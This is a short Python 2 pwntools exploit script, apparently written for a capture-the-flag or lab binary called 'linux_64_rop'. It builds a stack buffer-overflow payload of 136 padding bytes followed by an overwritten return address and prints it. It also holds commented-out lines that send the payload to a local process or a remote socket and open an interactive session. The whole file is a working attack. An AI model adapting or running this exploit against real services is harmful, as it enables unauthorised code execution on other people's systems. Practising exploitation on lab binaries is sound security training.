#coding:utf-8
from pwn import *
#elf = ELF('linux_64_rop')
#pro = process('./linux_64_rop')
#pro = remote('127.0.0.1', 10000)
padding = ""
for i in range(136):
    padding += 'A'
#0x7ff145e76590
#0x00000000004005bd
sys_addr = "\xbd\x05\x40\x00\x00\x00\x00\x00"

payload = padding + sys_addr
print payload
#pro.send(payload)
#pro.interactive()
